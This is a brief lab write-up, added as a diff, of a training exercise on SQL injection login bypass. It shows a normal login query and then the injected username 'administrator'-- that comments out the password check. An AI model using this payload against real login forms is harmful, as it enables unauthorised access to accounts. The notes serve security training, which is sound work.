@@ -1,0 +1,22 @@
+Lab 2 
+-----------------------------------------------------------------------
+SQL injection vulnerability allowing login bypass
+
+This lab contains a SQL injection vulnerability in the login function.
+To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.
+
+
+Solution :
+-----------------------------------------------------------------------
+Sql injection  - login functionally 
+End goal :  perform sql attack  and login as administrative user 
+
+
+Analysis: 
+SELECT  firstname FROM  user  where  username=  'admin' and password = 'admin'
+SELECT  firstname FROM  user  where  username=   ' ' ' and password = ' any thing that you can type here as password '
+SELECT  firstname FROM  user  where  username=   ' administrator '-- ' and password = 'any thing that you can type here as password ' 
+
+
+
+
